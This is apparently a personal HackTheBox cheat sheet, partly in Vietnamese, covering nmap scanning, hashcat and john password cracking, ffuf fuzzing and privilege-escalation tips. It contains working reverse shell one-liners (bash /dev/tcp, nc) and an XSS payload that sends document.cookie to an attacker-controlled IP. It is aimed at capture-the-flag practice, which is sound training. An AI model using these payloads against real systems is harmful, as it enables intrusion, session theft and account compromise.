# HackTheBox

# nmap

```
nmap -A
nmap -A -p-
```

# set hosts

window: C:\Windows\System32\drivers\etc
linux: /etc/hosts

# hash

`hashid hash.txt` để detect loại hash, xong dùng `hashcat`

- brute force theo định dạng:

```
hashcat -a 3 -m 1400 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d
```

- brute force theo wordlist:

```
hashcat -a 0 -m 3200 logan.txt /usr/share/wordlists/rockyou.txt
```

- john:

```
john --format=bcrypt --wordlist=$wordlists/passwords/rockyou.txt hash.txt
```

- `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
- SHA, $salt:$pass, salt là chữ số ($d), dùng cyberchef đổi sang format hex để decrypt:
![image](https://github.com/h2oa/HackTheBox/assets/114990730/79fa4fc2-4317-4575-89bb-cda7a30e106a)
```
hashcat -a 0 -m 120 "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" /usr/share/wordlists/rockyou.txt
```

# ffuf

```
ffuf -c -ic -w /usr/share/wordlists/dirb/big.txt -u http://devvortex.htb  -H "HOST:FUZZ.devvortex.htb" -fs 154
```

# reverse shell

thử hết các dạng :)))

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.74/1337 0>&1'
nc -c sh 10.10.14.74 1337
```

```
echo bHM= |base64 -d|bash
```

- Stabilizing the shell:

```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
```

# xss

```
php -S 0.0.0.0:80
python -m http.server 80
<img src=1 onerror=fetch('http://10.10.14.74/'+document.cookie);/>
```

# Kinh nghiệm

- login page: brute force, default account (tùy công nghệ)
- input: SSTI, command injection
- check `/var/mail` lấy thông tin mail nếu có
- fuzz subdomain, directory (`dirb <domain>`), path (`ffuf`)
- vào sqldatase
- `sudo -l` check xem user hiện tại thực hiện được gì với quyền root (search CVE với bất kỳ gì hiện ra trước)
- Thử cả `sudo su` và `su`
- lấy được 1 password thử với tất cả user ssh
